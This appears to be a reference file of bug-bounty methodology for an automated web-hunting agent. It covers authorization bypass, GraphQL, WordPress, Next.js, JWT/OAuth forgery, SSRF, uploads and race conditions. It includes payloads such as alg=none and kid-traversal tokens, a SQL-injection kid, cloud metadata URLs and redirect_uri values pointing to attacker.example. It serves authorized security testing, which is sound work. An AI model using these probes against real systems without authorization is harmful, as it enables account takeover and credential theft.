description: Curated read-only hunter guidance distilled from claude-bug-bounty methodology, web2 bug classes, advanced techniques, payload notes, and selected wordlist patterns. This file is reference material only; execution remains in hacker-bob MCP tools and agents.

entries.title: REST/API authorization and parser differentials
techniques: Use two accounts for object access checks: replay attacker requests with victim IDs, tenant IDs, UUIDs, slugs, and indirect report/export IDs.
Compare sibling routes and methods. If GET is guarded, test PATCH/PUT/DELETE, batch endpoints, old API versions, and mobile/API variants for inconsistent auth.
Probe parser differentials with JSON vs form vs XML, duplicate JSON keys, repeated query params, and X-HTTP-Method-Override only where the endpoint already accepts writes.
Prioritize high-impact objects: billing, exports, invitations, admin actions, documents, messages, tokens, and organization membership.
payload_hints: PATCH profile with hidden fields: role, is_admin, verified, credits, permissions
Try version downgrade patterns: /api/v3/... -> /api/v2/... -> /api/v1/... -> /api/...
Try pagination abuse only when list endpoints expose sensitive objects: limit=999999, per_page=100000, count=-1
Check common discovery paths: swagger.json, openapi.json, api-docs, api/graphql, api/config, api/admin

entries.title: GraphQL field-level authorization
techniques: Treat introspection as mapping, not a finding. Hunt for missing field-level auth, node/global ID object access, and mutation authorization gaps.
If introspection is blocked, use type suggestions, aliases, GET-vs-POST, content-type changes, and partial schema errors to discover fields.
Use aliases to test multiple object IDs in one request and compare attacker vs victim visibility with the same auth profile.
Check batching only where rate limits or OTP/login flows exist; record only if it enables practical bypass or account takeover.
payload_hints: { __schema { types { name fields { name type { name } } } } }
{ a1: user(id: 1) { id email } a2: user(id: 2) { id email } }
mutation { updateUserRole(userId: "VICTIM_ID", role: ADMIN) { id role } }
GET /graphql?query={__schema{types{name}}}

entries.title: WordPress REST, XML-RPC, and plugin action review
techniques: Enumerate REST users, author redirects, plugins, themes, uploads, debug logs, and backup config files, but only record when sensitive data or a real exploit path exists.
For authenticated testing, use the lowest role available and test plugin admin-ajax actions for nonce-only auth, role confusion, upload, export, and privilege changes.
Treat xmlrpc.php as a signal for brute-force or pingback SSRF only when you can show bypassed controls or meaningful internal interaction.
Use plugin/theme names and versions as leads for exploit research; banner disclosure alone is not reportable.
payload_hints: /wp-json/wp/v2/users and /?author=1
/wp-content/debug.log, /wp-config.php.bak, /wp-content/uploads/
POST /wp-admin/admin-ajax.php with action=PLUGIN_ACTION as subscriber
POST /xmlrpc.php system.listMethods

entries.title: Next.js data, middleware, and image optimizer checks
techniques: Inspect __NEXT_DATA__ and /_next/data JSON for authenticated props, user data, feature flags, internal URLs, and stale admin data.
Test middleware bypass with /_next/data route equivalents for sensitive pages and compare auth behavior with the page route.
For /_next/image or rewrite-backed proxy endpoints, test only bounded SSRF paths that can prove internal fetch or cloud metadata access.
Server Actions and API routes often have inconsistent CSRF/origin checks; prioritize destructive or account-changing actions.
payload_hints: /_next/data/BUILD_ID/admin/dashboard.json
/_next/image?url=https://attacker.example/redirect-to-internal&w=128&q=75
Origin: null on Server Action POSTs
Search JS/config for rewrites to internal destinations

entries.title: JWT, OAuth, and OIDC token trust boundaries
trigger_conditions: Any response contains `Authorization: Bearer <token>` where `<token>` parses as a JWT (three base64url segments; header decodes to a JSON object with `alg` and `typ`).
Any `Set-Cookie` value parses as a JWT (same shape test as above).
A login, token, or refresh endpoint responded with JSON containing any of `access_token`, `id_token`, `refresh_token`.
A signup or OAuth flow surfaced an `authorization_endpoint`, `token_endpoint`, or `jwks_uri`.
techniques: For JWT, test claim trust only when the app accepts tampered tokens: alg none, RS256-to-HS256 confusion, kid path tricks, attacker JWKS, role/sub/email edits.
For OAuth/OIDC, chain open redirects into redirect_uri validation, state/nonce weakness, missing PKCE, token leakage in Referer, and scope escalation.
Confirm impact by reaching protected data or impersonating a role. A weak token shape without accepted forgery is not enough.
Check .well-known metadata and JWKS for algorithm/key confusion leads before attempting token attacks.
payload_hints: /.well-known/openid-configuration and /.well-known/jwks.json
redirect_uri=https://attacker.example/callback or encoded/scheme-relative variants
JWT header tests: alg=none, HS256 with public key, kid=../../../../dev/null
Scope expansion: scope=openid profile email admin offline_access

auto_probes.name: Discover JWT metadata, JWKS, and live tokens
actions: GET {base}/.well-known/openid-configuration. Record: issuer, jwks_uri, authorization_endpoint, token_endpoint, response_types_supported, id_token_signing_alg_values_supported, scopes_supported.
GET {jwks_uri}. Record each key: kty, kid, alg, n/e (RSA) or crv/x/y (EC). Build {kid -> key} map.

Decode every observed JWT without verification (use mantis_decode_jwt). Record header (alg, kid, jku, x5u, x5c, jwk) and payload (iss, sub, aud, exp, iat, plus any of: role, roles, admin, is_admin, scope, scopes, groups, permissions, tenant_id, org_id).
Persist all of the above to engagement state under `engagement://auth/jwt/discovery/` so later probes don't re-fetch.
auto_probes.success_indicator: At least one of {JWKS captured, live JWT captured, OIDC config captured} succeeded.
auto_probes.stop_if: JWKS unreachable AND no JWT observed anywhere in the engagement — mark technique not-applicable and exit the auto_probes chain.

auto_probes.name: alg=none acceptance
actions: Build a forged token from the live JWT: set header to {"alg":"none","typ":"JWT"}, keep payload identical, set signature segment to empty.
Establish a baseline: replay the original live JWT against a protected endpoint that returned 200 for it. Save the response body hash.
Replay the forged (alg=none) token against the same protected endpoint.
Cross-check: replay forged token against an endpoint that returned 401/403 for an unauthenticated request.
auto_probes.success_indicator: Forged token returns 200 on a protected route AND the response body decodes to user-bound data whose `sub`/`email`/`user_id` matches the forged payload.
false_positive_filters: Reject if the forged response is byte-identical (or hash-equal) to the unauthenticated baseline — the server is ignoring the token, not accepting it.
Reject if 200 is only returned on cache/health/static endpoints.

auto_probes.name: RS256→HS256 key-confusion
auto_probes.fire_when: jwt-discover captured a JWKS containing at least one RS256/RS384/RS512 public key AND a live JWT signed with that key (matched by `kid` or by header `alg`).
actions: Export the matching public key from JWKS. Build two PEM byte representations: PKCS#1 (`-----BEGIN RSA PUBLIC KEY-----`) and SPKI (`-----BEGIN PUBLIC KEY-----`).
For each PEM variant, re-sign the live JWT payload with HMAC-SHA256 using the PEM bytes (including header/footer + newlines) as the secret. Set header.alg=HS256, keep header.kid intact.
Also try the PEM with trailing newline stripped, and with DER-encoded bytes as the secret.
Replay each variant against the same protected endpoint used as baseline in jwt-discover.
auto_probes.success_indicator: Server accepts any HS256-signed variant AND returns user-bound data.

auto_probes.name: kid traversal, SQLi, and command-injection sinks
auto_probes.fire_when: jwt-discover captured a JWT whose header contains `kid`.
actions: Forge a token with kid=`../../../../dev/null` signed with HMAC-SHA256 using an empty key (the file `/dev/null` reads as empty).
Forge a token with kid=`/dev/null` (no traversal) same signature scheme.
Forge a token with kid=`' UNION SELECT 'AAAA' --` signed with HMAC-SHA256(`AAAA`). If the server resolves kid via SQL, the union returns `AAAA` as the key.
Forge a token with kid containing a newline + command-injection payload (only if backend hints suggest shell resolution).
Replay each forged token against the baseline protected endpoint.
auto_probes.success_indicator: Any forged kid variant returns 200 on a protected route with user-bound data.

auto_probes.name: Attacker-controlled JWKS via jku / x5u / jwk
auto_probes.fire_when: jwt-discover captured a JWT with any of {jku, x5u, x5c, jwk} in its header, OR egress allowlist permits an attacker callback host.
actions: Generate an RSA keypair locally. Build a JWKS document containing the public half with kid matching the live token's kid.
Publish the JWKS via mantis-egress at an https URL on the allowlisted attacker domain.
Re-sign the live JWT payload with the local private key. Set header.jku (or x5u / jwk) to the published URL. Keep header.alg as RS256.
Replay against the baseline protected endpoint. In parallel, watch the mantis-egress access log for the JWKS fetch.
auto_probes.success_indicator: mantis-egress log shows the server fetched the attacker JWKS AND the replayed request returned 200 with user-bound data.
auto_probes.skip_if: Egress allowlist does not permit a publicly reachable attacker host — emit a `skipped_for_safety` note and continue.

auto_probes.name: Privileged claim tampering
auto_probes.fire_when: jwt-discover captured a JWT whose payload contains any of: `role`, `roles`, `admin`, `is_admin`, `scope`, `scopes`, `groups`, `permissions`, `tenant_id`, `org_id`, `tier`, `plan`.
actions: For each privileged claim, build a forged payload with elevated values: role=`admin`, is_admin=`true`, scope=`admin offline_access`, groups=`["admins","owners"]`, tenant_id swapped to a sibling tenant captured from a second account.
Produce two forged variants per claim edit: (a) re-signed with alg=none, (b) re-encoded without re-signing (some servers do not re-verify the signature).
Discover admin-only endpoints from the crawl: routes that returned 403 for the engagement user, or routes containing `/admin`, `/internal`, `/owner`, `/audit`.
Replay each forged variant against each candidate admin route.
auto_probes.success_indicator: An admin route returns 200 with an admin-shaped response body (e.g., contains a list of users, billing data, or audit log entries the engagement user did not previously see).
false_positive_filters: Reject if the admin route returns 200 for the engagement user with the original token as well — the route is not actually privileged.

auto_probes.name: redirect_uri validation
auto_probes.fire_when: jwt-discover captured an `authorization_endpoint` OR any auth flow URL contained a `redirect_uri` parameter.
actions: Enumerate the registered redirect_uri (from prior flows) — call its origin `victim.com/callback`.

Probe the authorize endpoint with these variants of redirect_uri: `https://attacker.example/callback`, `https://victim.com.attacker.example/callback`, `https://victim.com@attacker.example`, `https://victim.com/../../../attacker.example`, scheme-relative `//attacker.example`, percent-encoded `https%3A%2F%2Fattacker.example%2Fcallback`, and the registered URI with appended path `https://victim.com/callback/../../attacker`.
For each variant, follow the response and record whether the final Location contains `code=` or `access_token=` AND whose host that Location targets.
auto_probes.success_indicator: Authorization server issues a `code` or `access_token` to a Location whose host is not the registered redirect_uri host.

auto_probes.name: state / nonce / PKCE weakness
actions: Initiate three authorize flows: (a) with no `state` param, (b) with a reused `state` from a prior flow, (c) with a predictable `state` (e.g., `state=1`).
Initiate an authorize flow against the public-client config with no `code_challenge` / `code_challenge_method` (PKCE) params.
Drive each flow to completion at the token endpoint. Record whether each issued a token.
auto_probes.success_indicator: Token endpoint issues an access_token for a flow that omitted state OR omitted PKCE on a public client.

auto_probes.name: Scope escalation via refresh
auto_probes.fire_when: A `refresh_token` was captured AND the `token_endpoint` is reachable.
actions: Read `scopes_supported` from /.well-known/openid-configuration. Identify scopes the engagement user did not originally request (e.g., `admin`, `offline_access`, vendor-specific elevated scopes).
POST to token_endpoint with grant_type=refresh_token, refresh_token=<captured>, scope=`<original_scopes> admin offline_access`.
Decode the resulting access_token. Compare its scope claim to the requested scope.
Use the new access_token against an endpoint that previously returned 403 for the original scope.
auto_probes.success_indicator: Refresh issues an access_token whose decoded scope claim contains a scope never granted by the user AND that scope unlocks a previously-403 endpoint.

required_per_finding: Forged JWT exactly as sent on the wire.
Decoded JSON of original and forged header+payload, with a unified diff between the two payloads.
Full HTTP request and response for the baseline (untampered) call.
Full HTTP request and response for the forged call that triggered success_indicator.
For jku/x5u: the mantis-egress access-log entry showing the server-side JWKS fetch.
A second, independent replay of the forged request from a clean session to demonstrate reproducibility.

stop_conditions: Every probe in auto_probes ran and none hit its success_indicator — emit `not-vulnerable` summary listing what was tested, and stop. Do not iterate.

Any probe with severity_on_success `critical` confirmed — emit the claim, attach evidence, hand off to mantis-claim and mantis-verify, and stop iterating this surface to avoid noisy duplicate findings.
Egress, scope-guard, or auth-differential gates refused a probe — record `skipped` with reason, continue to the next probe.
Engagement request budget exhausted — flush partial findings and exit cleanly.

entries.title: SSRF and server-side URL fetch impact
techniques: DNS-only callbacks are lead data. Escalate to internal service access, cloud metadata, credential exfiltration, or internal admin reachability before recording.
Test redirect handling, parser confusion, IPv6/decimal/octal/hex loopback forms, and metadata hostnames only after confirming a server-side fetch.
Check second-order SSRF where a URL is saved first, then fetched by preview, import, PDF, avatar, or webhook processors.
Record exact request, callback evidence, and internal response evidence. Avoid high-volume port scans.
payload_hints: http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
External URL that 302 redirects to an internal URL

entries.title: Upload, file handling, and stored client-side execution
techniques: Check extension, MIME, magic-byte, path, and processing differentials. Look for stored XSS, parser bugs, overwrite, traversal, public object ACLs, and unsafe transforms.
For images/documents, test where uploaded content is rendered: user profile, admin moderation, PDF preview, email templates, and shared documents.
Do not report upload of inert files. Prove script execution, sensitive read/write, overwrite, or server-side processing impact.
If storage is cloud-backed, test signed URL scope, bucket listing, cross-tenant object access, and predictable object keys.
payload_hints: polyglot names: file.php.jpg, file.svg, file.html, file..jpg, file.jpg%00.php
SVG with harmless script proof for same-origin render checks
Content-Type mismatch: image/jpeg body with HTML/SVG, or form MIME vs file magic
Object key traversal/predictability: ../, tenant_id changes, sequential IDs

entries.title: Business logic and race-condition targets
techniques: Hunt workflow skips, negative/zero values, stale state, privilege-changing invitation flows, plan upgrades, refunds, and credit transfers.
Race only critical state transitions: coupon redemption, credit spend, password reset, MFA verify, invite accept, checkout, refund, and file processing.
Compare UI-enforced constraints with direct API requests. The best bugs live where client steps imply server trust.
Record only if money, credits, access, inventory, or account state changes in a way a real attacker can use.
payload_hints: amount=-100, quantity=0, price=0, plan=premium with skipped payment step
20 parallel identical redemption or transfer requests against one balance/coupon
Replay invite or reset token after use; accept invite while changing role/org params
Switch attacker/victim IDs in checkout, subscription, refund, invoice, or export routes
